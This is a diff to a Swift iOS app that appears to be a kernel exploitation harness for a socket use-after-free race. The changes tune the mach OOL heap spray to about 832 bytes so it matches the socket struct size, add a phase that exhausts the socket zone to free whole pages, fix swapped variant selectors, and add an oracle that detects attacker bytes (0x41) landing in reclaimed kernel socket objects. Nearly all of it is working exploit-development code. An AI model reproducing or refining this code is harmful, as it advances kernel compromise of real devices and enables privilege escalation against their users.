@@ -414,7 +414,7 @@ func runFuzzMode() async {
     func runWebMode() async {
         isRunning = true; status = "Web probe..."; log = ""
         try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
-        let target = webTarget.isEmpty ? "http://127.0.0.1:8777/brtest" : webTarget
+        let target = webTarget.isEmpty ? "http://192.168.1.99:8777/brtest" : webTarget
         webProbeURL = target
         emit("loading \(target) in a WKWebView; the WebKit networking process decodes it")
         try? await Task.sleep(nanoseconds: 15_000_000_000)
@@ -434,7 +434,7 @@ func runFuzzMode() async {
     func runWebScanMode() async {
         isRunning = true; status = "Web scan..."; log = ""; scanDone = false
         try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
-        let base = webTarget.isEmpty ? "http://127.0.0.1:8777" : webTarget
+        let base = webTarget.isEmpty ? "http://192.168.1.99:8777" : webTarget
         var target = base.hasSuffix("/page") ? base : base + "/page"
         target += "?t=\(Int(Date().timeIntervalSince1970))"
         emit("loading \(target); page streams decoded /brtest back")
@@ -683,7 +683,7 @@ func runFuzzMode() async {
         let doneAtClose = st.done
         for (i, fd) in fds.enumerated() where i != targetIdx && fd >= 0 { close(fd) }
         sockuaf_ool_reset()
-        let sprayed = sockuaf_ool_spray(4096, Int32(sprayCount), 0x41)
+        let sprayed = sockuaf_ool_spray(oolSpraySize(), Int32(sprayCount), 0x41)
         // Re-arm immediately: OOL gets first shot at any returned page, the new
         // sockets take whatever is left, so the stale sender must not land on
         // its own old page unless it was never returned.
@@ -698,7 +698,7 @@ func runFuzzMode() async {
         st.fd = -1
         st.mode = 0
         usleep(120)
-        emitBg("[*] ITER \(it) pagefree: \(fds.count) freed, sprayed \(sprayed)x4096 OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
+        emitBg("[*] ITER \(it) pagefree: \(fds.count) freed, sprayed \(sprayed)x\(oolSpraySize()) OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
         return st.postCloseOk > 0
     }
 
@@ -732,7 +732,7 @@ func runFuzzMode() async {
         for f in fds where f != target { close(f) }
         fds.removeAll()
         sockuaf_ool_reset()
-        let sprayed = sockuaf_ool_spray(4096, Int32(sprayCount), 0x41)
+        let sprayed = sockuaf_ool_spray(oolSpraySize(), Int32(sprayCount), 0x41)
         var w = 0
         while st.done < 6 && w < 200_000 { w &+= 1 }
         st.gate = 0
@@ -740,7 +740,7 @@ func runFuzzMode() async {
         st.fd = -1
         st.mode = 0
         usleep(80)
-        emitBg("[*] ITER \(it) batchgc: made/closing \(free), sprayed \(sprayed)x4096 OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
+        emitBg("[*] ITER \(it) batchgc: made/closing \(free), sprayed \(sprayed)x\(oolSpraySize()) OOL, done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
         return st.postCloseOk > 0
     }
 
@@ -1075,9 +1075,40 @@ func runFuzzMode() async {
         let t0 = Date()
         var maxAfterClose: Int32 = 0
 
+        // Zone-exhaustion pre-phase for the reclaim variants. Holding a large
+        // population of sockets forces the socket zone to grow; freeing batches
+        // then returns whole pages, which the OOL spray can take with attacker
+        // bytes instead of another socket.
+        var exhaustFds: [Int32] = []
+        if solo && (oolOnly || xzOnly || gcOnly) {
+            var rl = rlimit()
+            if getrlimit(RLIMIT_NOFILE, &rl) == 0 {
+                rl.rlim_cur = min(rlim_t(4096), rl.rlim_max)
+                setrlimit(RLIMIT_NOFILE, &rl)
+            }
+            for _ in 0..<4096 {
+                let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+                if f < 0 { break }
+                exhaustFds.append(f)
+            }
+            emitBg("[*] zone exhaust: holding \(exhaustFds.count) sockets")
+        }
+
         for it in 0..<iterations {
             if solo ? (hits >= 1 && it > 40) : hits >= 20 { break }
-            let r = oolOnly ? 6 : (xzOnly ? 5 : (gcOnly ? 7 : (udpOnly ? 8 : (precOnly ? 4 : it % 5))))
+            // NB: r==5 is the cross-zone reclaim (mach OOL), r==6 is the page-free
+            // block, r==7 is batch GC. The solo flags used to be swapped here, so
+            // --sockool ran the page-free variant and vice versa.
+            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : (precOnly ? 4 : it % 5))))
+            // Return a batch of held sockets so their pages go back to the page
+            // allocator, giving the OOL spray fresh memory to occupy.
+            if solo && !exhaustFds.isEmpty && it % 2 == 0 {
+                var n = 0
+                while n < 64 && !exhaustFds.isEmpty {
+                    close(exhaustFds.removeLast())
+                    n += 1
+                }
+            }
             if r == 0 {
                 // ---- variant A: single TCP socket, close racing in-kernel sends ----
                 let target = sockUafMakeSocket(ip, port)
@@ -1134,7 +1165,7 @@ func runFuzzMode() async {
                 // ---- variant F: cross-zone reclaim with mach OOL pages ----
                 let target = sockUafMakeSocket(ip, port)
                 if target >= 0 {
-                    if sockUafRaceCrossZone(st, target, it, 4096, 256) { hits += 1 }
+                    if sockUafRaceCrossZone(st, target, it, oolSpraySize(), 256) { hits += 1 }
                 }
             } else if r == 6 {
                 // ---- variant G: free a whole socket page, then OOL spray ----
@@ -1157,6 +1188,14 @@ func runFuzzMode() async {
                 }
             }
             if st.postCloseOk > maxAfterClose { maxAfterClose = st.postCloseOk }
+            // Cross-zone variants have no peer oracle; probe for sprayed bytes
+            // showing up as real socket fields instead.
+            if solo && r != 4 && it % 25 == 0 {
+                let fh = sockUafFillProbe()
+                if fh > 0 {
+                    emitBg("[!] iter \(it) r=\(r): FILL-HIT x\(fh) — sprayed bytes readable as socket fields")
+                }
+            }
             // Pace the loop: the CPU watchdog kills the app at ~90 s of CPU per
             // 180 s window (see analysis/evidence AGXProbe.cpu_resource reports).
             usleep(200)
@@ -1180,6 +1219,7 @@ func runFuzzMode() async {
             }
         }
 
+        for f in exhaustFds { close(f) }
         st.stop = 1
         usleep(5000)
         for t in timers { if t >= 0 { close(t) } }
@@ -1423,4 +1463,40 @@ func runFuzzMode() async {
             _ = writeAt(UInt32(Int64(UInt32(0)) - delta), 0)
         }
     }
+}
+
+// Socket-zone reclaim spray payload size (file scope so the nonisolated race
+// loops can call it). sizeof(struct socket) on arm64e iOS 27 is ~832 bytes;
+// the earlier hard-coded 4096 sprayed the wrong size class entirely, so the
+// attacker bytes never competed for a freed socket slot.
+// Override with `--spraysize=<bytes>` to sweep candidate sizes empirically.
+private func oolSpraySize() -> Int {
+    let a = ProcessInfo.processInfo.arguments
+    if let i = a.firstIndex(of: "--spraysize"), i + 1 < a.count,
+       let v = Int(a[i + 1]), v > 0, v <= 1 << 20 {
+        return v
+    }
+    return 832
+}
+
+// Fill-detection oracle for the cross-zone reclaim variants.
+// After spraying attacker bytes into freed pages, allocate fresh sockets and read
+// back their buffer limits. If a value comes back as the fill pattern, our data
+// landed in a kernel socket object — i.e. the cross-zone reclaim worked.
+private func sockUafFillProbe() -> Int {
+    var hits = 0
+    var fds: [Int32] = []
+    for _ in 0..<8 {
+        let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+        if f >= 0 { fds.append(f) }
+    }
+    for f in fds {
+        var v: Int32 = 0
+        var l = socklen_t(MemoryLayout<Int32>.size)
+        if getsockopt(f, SOL_SOCKET, SO_SNDBUF, &v, &l) == 0 && v == 0x41414141 { hits += 1 }
+        v = 0
+        if getsockopt(f, SOL_SOCKET, SO_RCVBUF, &v, &l) == 0 && v == 0x41414141 { hits += 1 }
+        close(f)
+    }
+    return hits
 }
